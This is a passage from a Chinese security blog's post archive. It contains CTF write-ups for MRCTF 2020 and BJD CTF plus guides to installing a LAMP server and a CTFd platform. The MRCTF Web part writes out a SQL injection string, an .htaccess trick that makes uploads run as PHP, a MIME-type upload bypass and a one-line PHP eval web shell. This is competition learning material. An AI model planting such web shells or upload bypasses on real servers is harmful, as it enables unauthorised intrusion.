3.根据一部分Public_key-&gt;生成随机数-&gt;爆出种子&gt;生成完整字符串4.输入用户名crispr+密码进行SQL注入&#39; or 1=1#+输入完整字符串得到flag 你传你🐎呢这个题，依旧很容易。不过当时忘了截图了，再做一遍：1.通过MIME绕过后端文件类型限制，即修改Content-Type: image/jpg然后构造.htaccess，实现重写文件解析。.htaccess文件内容为： &lt;FilesMatch &quot;webshell&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 先上传.htaccess，再上传webshell.jpg，然后webshell.jpg就当php解析了。webshell可为图片马，也可以只有下面内容： &lt;?php @eval($_POST[1]); ?&gt; 上传成功，菜刀或蚁剑一连。在根目录下找到flag Web还有两道题，一道依旧是pop链，另一道是多种手段动调+静态调试Web Assembly。pop链还没咋学，而这道pop链的题似乎看起来稍微难点，等学过后再总结。另一道题没听说过，有时间的话了解一下。。文末有官方wp参考链接 0x02 MISC不眠之夜一看到这个拼图，我就放弃拼了。以为需要一个一个拼，看了wp发现原来有工具。总结一下解法解法1：手动拼图这个就手工拼就好了。。。。。可以放ppt里拼解法2：写脚本+手拼我不会写，直接拿来大师傅写的脚本： 用下面两个脚本把纵向的大概拼一下，然后剩的为数不多的几张图再手动拼。 import os from PIL import Image s=[] for i in os.listdir(&#39;ini&#39;): if i[-4:]==&#39;.jpg&#39;: s.append(Image.open(open(&#39;ini/&#39;+i,&#39;rb&#39;))) for i in s: assert i.size[0]==200 and i.size[1]==100 print(len(s)) def dis(a,b): r=0 for i in range(3): if a[i]&gt;50 or b[i]&gt;50: r+=(a[i]-b[i])**2 else: r+=1000 return r def matchx(a,b): s=0 for i in range(200): s+=dis(a.getpixel((i,99)),b.getpixel((i,0))) return s t=[] for i in range(len(s)): for j in range(len(s)): if i==j:continue t.append((matchx(s[i],s[j]),i,j)) t.sort() rs=&#39;&#39; for i in t: rs+=&#39;%d %d %d\\n&#39;%i open(&#39;out.txt&#39;,&#39;w&#39;).write(rs) import os from PIL import Image im=Image.open(&#39;ini/00fd5b9.jpg&#39;) fn=[] for i in os.listdir(&#39;ini&#39;): if i[-4:]==&#39;.jpg&#39;: fn.append(&#39;ini/&#39;+i) s=[] for i in open(&#39;out.txt&#39;).readlines(): v=i.split() if len(v)==3: s.append(tuple(map(int,v))) nxt=[-1]*120 pre=[-1]*120 rem=120 for v,a,b in s: if nxt[a]==-1 and pre[b]==-1: nxt[a]=b pre[b]=a rem-=1 if rem==10: break for i in range(120): if pre[i]==-1: t=[] x=i while x!=-1: t.append(fn[x]) x=nxt[x] print(len(t)) imt=im.resize((200,100*len(t))) cnt=0 for j in t: imv=Image.open(j) imt.paste(imv,(0,100*cnt,200,100*(cnt+1))) cnt+=1 imt.save(&#39;outi/%d.png&#39;%i) 先建两个文件夹ini和outi。ini里放图片碎片，outi是脚本最后生成的图片。这道题，注意删除一张不是图片碎片的jpg文件。然后执行脚本，最后把outi里的图片再大致手拼一下就好了解法3：gayhub上的gaps工具使用gaps工具是最好的方法。具体安装及使用流程：（1） ImageMagick安装 apt-get install libjpeg* apt-get install libpng* apt-get install libtiff* apt-get install libungif* apt-get install freetype* apt-get install zlib* #下载：http://www.imagemagick.org/download/ImageMagick-7.0.10-5.tar.gz tar zxvf ImageMagick-7.0.10-5.tar.gz cd ImageMagick-7.0.10-5 ./configure &amp;&amp; make &amp;&amp; make install #测试：convert 1.jpg 1.png 没报错并成功转换就是安装成功 （2）gaps安装 git clone http://github.com/nemanja-m/gaps.git cd gaps pip install -r requirements.txt #如果爆模块安装过的错误，直接在txt文件列表删掉该模块即可 sudo apt-get install python-tk pip install -e . 执行下面命令，完成拼图： montage *jpg -tile 10x12 -geometry 200x100+0+0 out.jpg #把图片碎片合成一个图片 # 将目录中的jpg文件按顺序拼成x轴10块，y轴12块，每个图块大小为200x100像素，输出文件为out.jpg gaps --image=out.jpg --generations=50 --population=120 --size=100 #还原原图片 --image 指向拼图的路径 --size 拼图块的像素尺寸 --generations 遗传算法的代的数量 --population 个体数量 --verbose 每一代训练结束后展示最佳结果 --save 将拼图还原为图像 参考MISC大师傅博客：ga1@xy Unravel1.binwalk分离图片发现带有aes的Tokyo2.然后查看.wav文件尾，发现密文(也可以先发现这个密文，Base64解出Salted，“加盐”，想到找密钥)3.利用密码解密的得到Ending.wav4.通过silenteye解LSB隐写得到flag pyflag这个题也大致总结下思路：1.使用winhex或strings命令发现文件末尾隐藏信息2.strings会发现[Secret File Part 1-3]的标识3.16进制打开则发现文件尾的结束符并非jpg的标准结束符FF D94.将三段隐藏信息复制到winhex中，得到一个压缩包5.暴力破解得到弱密码：12346.得到一个flag.txt和.hint.txt。提示0x10,0x20,0x30,0x55。即base16,32,64,85编码。7.写脚本解码即可，由于之前写过一个脚本，直接使用即可。(这里就不贴出源码了)自己可参考：http://www.wishingstarmoye.com/tools/base64 千层套路1.自动化解压zip尝试发现zip的解压密码是文件名字，可以写脚本。这种脚本之前BJD已经见过，看wp写的python2的脚本，算了，不想用。我直接把BJD那个脚本改一下(发现脚本其实特别简单，当时我以为脚本很难。还是自己写脚本用着香啊。。。)： import os import filetype import time while 1: files = os.popen(&#39;ls&#39;) filename = files.read().replace(&#39;1.py&#39;,&#39;&#39;).replace(&#39;\\n&#39;, &#39;&#39;) password = filename.replace(&#39;.zip&#39;, &#39;&#39;) kind = filetype.guess(filename) #返回文件类型对象 if kind.extension is &#39;zip&#39;: #支持类型，kind.extension 后缀，kind.mime MIME类型 os.system(&quot;unzip -P {} {}.zip&quot;.format(password, password)) #unzip -P a a.zip os.system(&quot;rm &quot;+password+&quot;.zip&quot;) time.sleep(0.1) else: print(&#39;解压完成&#39;) break 2.像素点画图这个用过gnuplot利用坐标画过图，这里是利用像素点画图，直接用脚本(这个也挺容易写)：可以参考：PIL模块使用 from PIL import Image x = 200 #x坐标 通过对txt里的行数进行整数分 y = 200 #y坐标 x * y = 行数 im = Image.new(&quot;RGB&quot;, (x, y)) file = open(&#39;qr.txt&#39;) for i in range(0, x): for j in range(0, y): line = file.readline() #获取一行的rgb值 line = line[:-2] line = line[1:] #print(line) rgb = line.split(&quot;, &quot;) #分离rgb，文本中逗号后面有空格 im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) im.save(&#39;flag.png&#39;) 得到一张二位码，扫描得到flag 你能看懂音符吗复现后，这里只写一下思路：1.修复文件头6152改为52612.word隐写，即显示隐藏文字(之前已了解过，Word文字的三种隐藏方法)3.解密音符(这个之前没见过，不过千千秀字上有文本加密为音乐符号在线解密) 寻找xxx就是个简单的拨号音隐写(dtmf)。跑脚本的话，我跑出的结果错了几位，只好一个一个的听了，参考通过按键音判断输入的数字。或者通过拨号音的信号频率判断，这个可以使用Au。当然这类题有的也可以直接用dtmf-decoder脚本或DTMF decoder安卓app或工具dtmf2num 0x03 后记通过这次做题，我了解到(或简单总结)了一些bypass、初识了POP链、mt_rand()函数的PHP伪随机性、拼图脚本及工具的使用、音频的LSB隐写、Base家族的其他成员、文件名为密码解压压缩包脚本的编写、利用PIL库和py脚本进行像素点画图、音乐符号解密、拨号音隐写。好了，大概就那么多，继续加油！！ 官方wp：MRCTF新生赛 2020","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.github.io/tags/MISC/"}],"author":"qwzf"},{"title":"Centos之源码安装LAMP服务器","slug":"Centos之源码安装LAMP服务器","date":"2020-04-08T14:50:25.000Z","updated":"2020-08-01T15:54:57.468Z","comments":true,"path":"2020/04/08/Centos之源码安装LAMP服务器/","link":"","permalink":"https://qwzf.github.io/2020/04/08/Centos之源码安装LAMP服务器/","excerpt":"","text":"前言上个周三在Linux课上，让搭建LAMP环境，当时没搭好。周末搭的时候遇到一个百度搜不到的报错，整了一天也没解决。而在昨天晚上我成功解决了那个报错(原因是zlib库安装问题。不说了，我太菜了)。于是今天把LAMP完整的搭好了。并记录了下搭建过程： 1、准备环境1.概述L：Linux 提供底层操作系统平台A：Apache 提供一个浏览器的支持M：MySQL 提供数据库支持P：PHP/Perl/Python 提供人性化显示 安装顺序：Linux-&gt;Apache-&gt;MySQL-&gt;PHP2.环境（1）安装编译工具gcc、gcc-c++（2）关闭系统RPM安装包的Apache、MySQL的服务（3）关闭SELinux、防火墙（4）关闭不必要的服务（5）拷贝源码包，通过脚本批量安装（6）确认磁盘空间未满源码安装eject弹出光盘 2、环境安装镜像包：LAMP.iso1.连接lamp源码包镜像LAMP.iso。将lamp-php5.4复制到/usr/src/lamp cp -rf /run/media/root/20150430_144909/lamp-php5.4 /usr/src/lamp 2.挂载Centos系统镜像到/media mount /dev/cdrom /media 3.安装编译工具gcc yum -y install gcc* 4.关闭系统RPM安装包的Apache、MySQL的服务系统没有安装Apache、MySQL的服务。如果安装了的话，使用service 服务名 stop 关闭服务如果设置开机不启用chkconfig httpd off5.关闭SELinux、防火墙 iptables -F #清空防火墙所有内容 vi /etc/selinux/config setenforce 0 #临时状态设为不启用 6.关闭不需要的服务7.脚本批量安装 cd /usr/src/lamp #!/bin/bash /bin/ls *.tar.gz &gt;ls.list /bin/ls *.tgz &gt;&gt; ls.list for a in `cat ls.list` do /bin/tar -zxf $a done rm -rf ls.list 8.确认磁盘空间df -h注意：目录名不要改顺序不要改 3、安装一些软件包1.安装python底层环境yum -y install python-devel 2.安装libxml2 解释器启用对其他语言的支持 cd /usr/src/lamp/libxml2-2.9.1/ ./configure --prefix=/usr/local/libxml2/ make make install 3.安装libmcrypt提供加密算法 cd /usr/src/lamp/libmcrypt-2.5.8/ ./configure --prefix=/usr/local/libmcrypt/ make make install 4.安装mhash提供加密方式的扩展先安装libltdl cd /usr/src/lamp/libmcrypt-2.5.8/libltdl/ ./configure --enable-ltdl-install #启用安装 make make install 然后安装mhash cd /usr/src/lamp/mhash-0.9.9.9/ ./configure make make install 5.安装mcrypt提供php相关的加密支持扩展 cd /usr/src/lamp/mcrypt-2.6.8 LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib \\ ./configure --with-libmcrypt-prefix=/usr/local/libmcrypt make make install 6.安装zlib提供压缩用途的函数库按照视频里的方法，没安装成功，于是修改了点 cd /usr/src/lamp/zlib-1.2.3/ ./configure --prefix=/usr/local/zlib/ make make install export LDFLAGS=&quot;-L /usr/local/zlib/lib&quot; export CPPFLAGS=&quot;-I /usr/local/zlib/include&quot; 7.安装libpng提供png格式的图片的库 cd /usr/src/lamp/libpng-1.2.31/ ./configure --prefix=/usr/local/libpng make make install 执行make发现下载zlib-devel，然后重新执行make命令，成功了。 yum install zlib-devel 8.安装jpeg6提供jpeg格式的图片的库 mkdir /usr/local/jpeg6 mkdir /usr/local/jpeg6/bin mkdir /usr/local/jpeg6/lib mkdir /usr/local/jpeg6/include mkdir -p /usr/local/jpeg6/man/man1 yum -y install libtool cd /usr/src/lamp/jpeg-6b/ cp /usr/share/libtool/config/config.sub . cp /usr/share/libtool/config/config.guess . ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static make make install 9.安装freetype提供字体相关引擎 cd /usr/src/lamp/freetype-2.3.5/ ./configure --prefix=/usr/local/freetype make make install 10.安装GD提供PHP图形扩展库。提供一个API。接收处理图片 mkdir /usr/local/gd2 cd /usr/src/lamp/gd-2.0.35 vi gd_png.c ./configure --prefix=/usr/local/gd2/ --with-jpeg=/usr/local/jpeg6/ --with-freetype=/usr/local/freetype/ --with-png=/usr/local/libpng/ make make install 4、开始安装1.安装Apache（1）安装 cd /usr/src/lamp/ cp -r apr-1.4.6 httpd-2.4.7/srclib/apr cp -r apr-util-1.4.1 httpd-2.4.7/srclib/apr-util cd /usr/src/lamp/httpd-2.4.7 ./configure --prefix=/usr/local/apache2/ --sysconfdir=/usr/local/apache2/etc --with-include-apr --enable-so --enable-deflate-shared --enable-expires=shared --enable-rewrite=shared 执行结果，缺少pcre-config，进行安装： cd /usr/src/lamp/pcre-8.34/ ./configure make make install cd /usr/src/lamp/httpd-2.4.7 ./configure --prefix=/usr/local/apache2/ --sysconfdir=/usr/local/apache2/etc --with-include-apr --enable-so --enable-deflate-shared --enable-expires=shared --enable-rewrite=shared make make install 安装成功（2）启动apache21.启动apache2遇到一个错误，原因：Apache安装是编译安装，安装路径不是默认路径，Apache服务没有添加到Linux服务中2.解决方法：1）将链接apachectl 复制到系统启动目录下并命名为httpd cp /usr/local/apache2/bin/apachectl /etc/rc.d/init.d/apache2 现在就可以使用service httpd start等命令了，但在linux服务列表还没有注册2）使用chkconfig来注册apache服务，并且可以在linux的服务列表中看到chkconfig –list在init.d的httpd链接文件中第2行添加如下注释： vi /etc/rc.d/init.d/apache2 意义: 35：在3级别和5级别（级别见文末TIPS）启动apache2 61：启动顺序为61号，S61 61：关闭顺序为61号，K61 当进行chkconfig --add apache2操作时，如果没有指定level那么就会来这个注释中取值 3）将httpd配置自启并加入linux服务监控 chkconfig --add apache2 解决方法参考：把httpd加入到service并设置启动参考过程中只把httpd改为apache2，其他不变。3.再次启动apache2 service apache2 start 然后就发现启动成功了。（3）测试1.先自己在物理机上测试访问一下Centos虚拟机ip：192.168.1.33Apache搭建成功，也可用Centos上的elinks工具进行测试。2.安装elinks yum -y install elinks 测试一下 elinks 192.168.1.33 测试成功。 2.安装MySQL（1）安装 yum -y install cmake yum -y install bison #语法解释器 （2）建立mysql用户并安装mysql useradd mysql #查看id mysql cd /usr/src/lamp/mysql-5.5.23/ [root@qwzf mysql-5.5.23]# cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \\ &gt; -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DEXTRA_CHARSET=all -DDEFAULT_CHARSET=utf8 \\ &gt; -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 \\ &gt; -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 \\ &gt; -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_USER=mysql \\ &gt; -DMYSQL_TCP_PORT=3306 发现报错：解决方法： yum -y install ncurses-devel cd /usr/src/lamp/ncurses-5.9/ ./configure --with-shared --without-debug --with-ada --enable-overwrite make make install cd .. rm -rf mysql-5.5.23 #删掉原来的目录 tar -zxf mysql-5.5.23.tar.gz #再次解压 然后重新编译安装mysql安装成功，然后 make make install （3）进入mysql目录更改权限 cd /usr/local/mysql chown -R mysql:mysql . #改属主 /usr/local/mysql/scripts/mysql_install_db --user=mysql #数据库初始化 初始化成功，授权表和库的权限 chown -R root . chown -R mysql data/ cp support-files/my-medium.cnf /etc/my.cnf #复制配置文件 （4）开启MySQL并查看 /usr/local/mysql/bin/mysqld_safe --user=mysql 发现开启失败。杀死mysql的进程，再初始化数据库，然后启动 ps aux | grep mysql /usr/local/mysql/scripts/mysql_install_db --user=mysql /usr/local/mysql/bin/mysqld_safe --user=mysql netstat -anpt 发现3306端口已经打开，数据库已经启动添加mysql开机自启 vim /etc/rc.d/rc.local （5）登陆mysql并设置密码登录mysql /usr/local/mysql/bin/mysql 设置密码，然后登录mysql /usr/local/mysql/bin/mysqladmin -u root password &#39;wmm123&#39; /usr/local/mysql/bin/mysql -u root -p 如果退出要删除history，因为会记录设置的密码 history -c 至此，MySQL安装测试成功。 3.安装PHP（1）先安装上预先准备好的环境 yum -y install libtool* （2）修改配置文件以支持数据库的内容 vim /usr/local/gd2/include/gd_io.h 添加上这一行代码(为了使php读到数据库内容)，保存退出（3）安装php cd /usr/src/lamp/php-5.4.25/ #指定之前安装过的软件路径 [root@qwzf php-5.4.25]# ./configure --prefix=/usr/local/php/ \\ &gt; --with-config-file-path=/usr/local/php/etc/ \\ &gt; --with-apxs2=/usr/local/apache2/bin/apxs \\ &gt; --with-mysql=/usr/local/mysql \\ &gt; --with-libxml-dir=/usr/local/libxml2 \\ &gt; --with-jpeg-dir=/usr/local/jpeg6/ \\ &gt; --with-png-dir=/usr/local/libpng/ \\ &gt; --with-freetype-dir=/usr/local/freetype/ \\ &gt; --with-gd=/usr/local/gd2/ \\ &gt; --with-mcrypt=/usr/local/libmcrypt/ \\ &gt; --with-mysqli=/usr/local/mysql/bin/mysql_config \\ &gt; --enable-soap --enable-mbstring=all --enable-sockets --with-pdo-mysql=/usr/local/mysql --without-pear 执行成功，然后 make make install 源码编译安装成功，然后配置文件创建存放配置文件的目录并复制一下主配置文件 mkdir /usr/local/php/etc cp php.ini-production /usr/local/php/etc/php.ini 添加指定的那一行，保存退出 vi /usr/local/apache2/etc/httpd.conf 重启Apache /usr/local/apache2/bin/apachectl stop /usr/local/apache2/bin/apachectl start #/usr/local/apache2/bin/apachectl restart 好了，到这里Apache、MySQL和PHP安装成功。下面进行测试 5、进行测试1.Apache与PHP在/usr/local/apache2/htdocs/目录下创建一个index.php写入PHP代码，这里直接写个查看phpinfo信息的： &lt;?php phpinfo(); ?&gt; 物理机上进行访问测试成功，说明Apache能与PHP一起工作 2.Apache与MySQL写一个qwzf.php，内容如下： &lt;?php $link=mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;wmm123&#39;); if($link) echo &quot;I am wmm!!!&quot;; mysql_close(); ?&gt; 物理机上访问说明MySQL能与Apache一起工作 3.安装phpmyadmin为了方便数据库管理，可以安装一下phpmyadmin cd /usr/src/lamp/ cp -r phpMyAdmin-4.1.4-all-languages /usr/local/apache2/htdocs/phpmyadmin 进入phpmyadmin目录，生成配置文件 cd /usr/local/apache2/htdocs/phpmyadmin cp config.sample.inc.php config.inc.php #修改访问类型 vim config.inc.php #将cookie改成http 访问phpmyadmin，输入mysql用户和密码，看到如下界面 到此，LAMP环境完全搭建成功。 感悟了解了源码安装的整个过程，又增强了自己解决报错的能力。","categories":[{"name":"运维","slug":"运维","permalink":"https://qwzf.github.io/categories/运维/"},{"name":"Linux网络服务","slug":"运维/Linux网络服务","permalink":"https://qwzf.github.io/categories/运维/Linux网络服务/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://qwzf.github.io/tags/Linux/"},{"name":"LAMP","slug":"LAMP","permalink":"https://qwzf.github.io/tags/LAMP/"}],"author":"qwzf"},{"title":"一篇文章带你搭建CTF平台-基于CTFd的H1ve","slug":"一篇文章带你搭建CTF平台-基于CTFd的H1ve","date":"2020-03-31T16:50:05.064Z","updated":"2020-08-01T17:47:10.076Z","comments":true,"path":"2020/04/01/一篇文章带你搭建CTF平台-基于CTFd的H1ve/","link":"","permalink":"https://qwzf.github.io/2020/04/01/一篇文章带你搭建CTF平台-基于CTFd的H1ve/","excerpt":"","text":"前言前段时间发现了一个界面精美的CTF平台-H1ve，发现它是在CTFd的基础上进行美化的。然后，我们团队的lemon搭建了一下，由于某些原因不能用了(服务器到期)。于是我参考其搭建笔记又搭了一遍，发现了几个新的问题。继续总结一下搭建过程及所可能遇到的问题吧。。。 0x00 搭建环境 Centos 7 64位(其他版本暂未测试)Dockerpython2.7 0x01 搭建流程1、服务器准备一个云服务器，阿里云、腾讯云和华为云均可。镜像选择Centos 7.x 64位的，只要是Centos 7 64位就行，具体版本无所谓。 2、安装docker1.安装所需软件包 sudo yum install -y yum-utils device-mapper-persistent-data lvm2 bind-utils 2.设置yum源 sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo 设置yum源主要是提高yum下载速度3.安装docker sudo yum install docker-ce 如果安装失败，可采用下面的脚本脚本安装 curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 4.启动并加入开机启动 sudo systemctl start docker #或sudo service docker start sudo systemctl enable docker 5.验证是否安装成功 docker version 3、安装docker-compose1.安装epel-release yum -y install epel-release 2.安装python-pip yum -y install python-pip 如果出现未找到匹配的参数: python-pip 错误:没有任何匹配: python-pip（1）可能原因：Centos中有的源是被禁用的，通过以下命令可以查看启用的源和禁用的源。 #查看启用的源列表 yum repolist #查看禁用的源列表 yum repolist disabled 查看之后，发现epel在禁用列表里。（2）修复方法：启用的方法： vi /etc/yum.repos.d/epel.repo 将第一个和第三个的enabled=0改成enabled=1，第二个是测试版的可能不稳定所有别修改。修改后就可以安装python-pip了。也可参考：CentOS下使用yum安装python-pip失败的完美解决方法3.升级pip pip install --upgrade pip 如果出现ModuleNotFoundError: No module named &#39;pip._internal&#39;（1）可能原因：与旧版冲突导致了这个报错。（2）修复方法： python -m ensurepip python -m pip install --upgrade pip 更多修复方法参考：ModuleNotFoundError: No module named ‘pip._internal’ , pip 无法下载软件 解决办法4.安装docker-compose pip install docker-compose 如果出现ReadTimeoutError: httpConnectionPool(host=&#39;pypi.python.org&#39;, port=443): Read timed out（1）可能原因：(暂时我不知道)（2）修复方法： pip --default-timeout=200 install -U docker-compose 如果出现由于忘了截图了，上边都没有配图。但这个发现我们团队的lemon截图了，于是拿来即用。（1）可能原因：缺少openssl-devel支持（2）修复方法： yum install gcc libffi-devel python-devel openssl-devel -y 也可参考：解决”command ‘gcc’ failed with exit status 1”错误问题 然后重新使用pip安装docker-compose pip install docker-compose 5.验证是否安装成功 docker-compose version 如果出现/usr/lib/python2.7/site-packages/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.25.8) or chardet (2.2.1) doesn&#39;t match a supported version!（1）可能原因：python库中urllib3 (1.25.8) or chardet (2.2.1) 的版本不兼容（2）修复方法： pip uninstall urllib3 pip uninstall chardet pip install requests 如果出现from backports.shutil_get_terminal_size import get_terminal_size ImportError: No module named shutil_get_terminal_size（1）可能原因：1）未安装ipython或安装有问题(我遇到的是这个原因)2）(第二个原因暂时不清楚)（2）修复方法：1）针对原因1)，可以用pip安装ipython： pip install ipython 如果安装之后，还有这个错误，可使用下面这个命令： pip install --force ipython 2）针对原因2)，报错信息显示在/usr/local/lib/python2.7/dist-packages/IPython/utils/terminal.py的from backports.shutil_get_terminal_size import get_terminal_size as _get_terminal_size出错。sudo vi vi /usr/lib/python2.7/site-packages/IPython/utils/terminal.py打开此脚本将出错的代码段修改如下：然后再次输入进行测试 docker-compose version 注意：如果docker-compose版本过低，则无法启动H1ve-CTFd 3、安装与启动H1ve开源平台地址 https://github.com/D0g3-Lab/H1ve 看着挺精美的，那就开始安装吧！ 1.搭建前准备（1）安装git一般情况下Centos上可能没安装git，从github上克隆项目需要用到这个。(当然也可以用本地自己的电脑下载好，然后上传到服务器。这样的话，就不需要安装git)安装git命令： yum -y install git 克隆CTF平台项目源码 git clone https://github.com/D0g3-Lab/H1ve.git （2）配置docker源为国内源这个主要是因为当拉取镜像时，由于远端仓库的服务器是在国外，国内用户拉取镜像的速度特别慢，或很可能都访问不了，产生报错。下面有我发现的两个好用的国内docker源：1）阿里云镜像加速器 https://(yourid).mirror.aliyuncs.com 2）ustc(中国科学技术大学) https://docker.mirrors.ustc.edu.cn 下面是以阿里云镜像加速器为例，配置docker国内源：阿里云的docker镜像加速器需要注册账号，每个人都有自己唯一的地址。可以采用里边给定的配置docker镜像加速器的方法，也可以：（1）使用vi编辑器写入/etc/docker/daemon.json vi /etc/docker/daemon.json 添加下面内容： { &quot;registry-mirrors&quot;: [&quot;https://(yourid).mirror.aliyuncs.com&quot;] } 保存退出（2）重启docker sudo systemctl daemon-reload systemctl restart docker 2.开始搭建H1ve进到下载好的项目H1ve根目录，执行下面的命令： docker-compose -f single.yml up 默认的端口是8000(可在Dockerfile文件中进行修改，尽量不要改)，访问一下服务器的IP地址，就会发现搭建成功了。如果运行过程中出现响应码500错误，重启环境即可(暂时没发现好的方法解决)在项目根目录下，重启命令： docker-compose -f single.yml down docker-compose -f single.yml up 0x02 修改首页内容1.修改首页信息即修改下面箭头所示信息：修改方法如下：然后修改下面这个文件即可：2.修改首页logo如果要换页面首页的logo的话，在服务器里找到下面这个文件替换即可：当然我只是测试了下，不知道替换后会不会侵权，能不替换还是不要替换了。也可以替换一些其他的地方信息，但不晓得会不会侵权。我只知道如果修改后用于商业用途是一定会侵权的，不用作商业用途应该不会侵权。 0x03 后记搭建过程中，解决报错还是挺有趣的，不仅培养了自己的解决报错的能力，而且还可以让自己产生一些思考，真的挺不错的。继续努力吧，做一个奋进的精神小火。。。","categories":[{"name":"运维","slug":"运维","permalink":"https://qwzf.github.io/categories/运维/"},{"name":"服务搭建","slug":"运维/服务搭建","permalink":"https://qwzf.github.io/categories/运维/服务搭建/"}],"tags":[{"name":"搭建","slug":"搭建","permalink":"https://qwzf.github.io/tags/搭建/"},{"name":"H1ve","slug":"H1ve","permalink":"https://qwzf.github.io/tags/H1ve/"},{"name":"CTFd","slug":"CTFd","permalink":"https://qwzf.github.io/tags/CTFd/"}],"author":"qwzf"},{"title":"第二届BJD CTF做题总结与题目复现-MISC&Crypto","slug":"第二届BJD CTF做题总结与题目复现-MISC&Crypto","date":"2020-03-28T16:38:59.324Z","updated":"2020-08-12T08:45:08.878Z","comments":true,"path":"2020/03/29/第二届BJD CTF做题总结与题目复现-MISC&Crypto/","link":"","permalink":"https://qwzf.github.io/2020/03/29/第二届BJD CTF做题总结与题目复现-MISC&Crypto/","excerpt":"","text":"0x00 前言上周参加了第二届BJD CTF，本Web dog太垃圾，就做出两道Web。不过还好MISC和Crypto做的还行。那就先总结复现一下。标*表示未作出的 0x01 MISC这个做的还行，不过有三道未做出(其中一道是mikutap。听，然后找按键盘进行对应，这个就算了，不想做)，好了开始复现 最简单的misc-y1ng就是简单的文件头填充。看到IHDR，很明显想到png图片。添加文件头89504E47，改后缀，得到16进制16进制转字符串即可得到flag A_Beautiful_Picture改图片高度即可 EasyBaBa这个就比较有趣了，直接用winrar打开得到里面都是出题人.jpg，进行格式分析发现是avi视频文件，改后缀播放，发现有东西，扔到Pr逐帧分析得到四张二维码。扫描得到4串十六进制6167696E5F6C6F76655F59424A447B696D316E677DHex-&gt;ASCII排序即可。 小姐姐-y1ngwinhex搜索BJD即可 *Real_EasyBaBa这个当时没做出来。看了官方wp发现最后一步去除所有0没有想到。。。。png文件用winhex打开，搜索504B，将FFFF改为0304(可以先用binwalk分析下发现有zip，因为之前我做过类似的，所以就直接改),直接winrar打开解压hint文件。打开是二维码，扫描得到命令od -vtx1 ./draw.png | head -56 | tail -28linux之od命令然后执行od -vtx1 ./ezbb_r.png | head -56 | tail -28这个命令，得到然后就是我没想到的地方：把00字节去掉，得到图案即是flag *圣火昭昭这个找新佛语解密网站找了好久，以前都是佛语。。。。下载图片查看属性，得到新佛曰：，以前要么没有这仨字，要么是佛曰：。所以找到新佛语解密网站，解密得到(hint说key去掉com，key应该就是gemlove)试了下不是flag，应该是某种隐写的密码。然后没思路了，于是看看题目描述和群里管理员“猜”发现“猜“这个字很魔性。然后我没见过类似的隐写，然后就断这里了。。看了一眼官方wp发现是outguess 隐写 ，没听说过。查了下，发现直接用一个工具即可。outguess的安装： git clone https://github.com/crorvick/outguess 进行下载 下载完成后进入outguess文件夹，右击打开终端，执行命令： ./configure &amp;&amp; make &amp;&amp; make install 进行编译及安装。 outguess的常见使用： 对图片信息进行破解： outguess -r /root/qwzf.jpg hidden.txt 带key的： 加密：outguess -k &quot;abcd&quot; -d hidden.txt demo.jpg out.jpg 解密：outguess -k &quot;abcd&quot; -r out.jpg hidden.txt 好了，我直接执行执行成功，打开qwzf.txt得到flag *TARGZ-y1ng.tar.gz文件直接用winrar解压发现需要输入密码，并不是伪加密，也爆破不出来。于是看看题目描述tar zxvf，即tar -zxvf 压缩文件名。还好linux学过，是.gz格式的解压缩并解打包。试下linux解压缩并并解打包命令，然后发现依旧需要密码。密码在哪呢？试试文件名。果然是解压密码。一直解一直解。好吧，我自闭了，不做了。看官方wp写个脚本挺省事。但官方脚本有时候会报错(有关系统操作的脚本我还没学过怎么写，抽时间补下相关知识，然后再改下)。decompress.py import os import filetype import time while 1: aa = os.popen(&#39;ls&#39;) filename = aa.read().replace(&#39;decompress.py&#39;,&#39;&#39;).replace(&#39;\\n&#39;, &#39;&#39;) a = filename.replace(&#39;.tar.gz&#39;, &#39;&#39;) kind = filetype.guess(filename) if kind.extension is &#39;zip&#39;: os.system(&quot;mv {} {}.zip|unzip -P {} {}.zip&quot;.format(filename, a, a, a)) os.system(&quot;rm *.zip&quot;) time.sleep(0.1) else: print(&#39;解压完成&#39;) break 执行脚本，得到flag文件。 0x02 Crypto*老文盲了主要就是生僻汉字拼音，找个在线汉字转拼音即可然后发现拼音再转换成汉字是BJD{这就是flag直接交了吧}，我交，不对。。。问了下群管理员，让我考虑下&quot;这”还可能是什么？emmmm，试了好多不对。。看官方wp说花括号{}里的汉字再与之前的生僻字对应，也就是BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}确定这是Crypto，感受到一丝MISC的味道。。 cat_flag这个呢，就比较简单了。每行8张小图片，有吃的、无吃的。很明显可能就是二进制嘛，8bit一个字节，刚刚好。手工转换下，得到 01000010010010100100010001111011010011010010000101100001001100000111111001111101 然后二进制转ASCII，得到flag。还是感觉这道题也有MISC的感觉。 灵能精通说实话，没见过，感觉是凯撒变种，但是搜不到。经别人提醒，知道是圣堂武士密码对照着解密就ok了。。emmmmm，突然发现上边这解密图上的水印似乎是我的某位学长？？！！！于是好奇的搜了下，发现一篇总结很全面的好文章：CTF中Crypty（密码类）入门必看 燕言燕语题目：79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20hex-&gt;asciiyanzi应该是密钥，后边的是密文。于是开始尝试，由于最近刚看过维吉尼亚密码，所以尝试。果然是维吉尼亚密码加密，解密即可。维吉尼亚密码加解密原理及其实现 *Y1nglish-y1ngNkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su 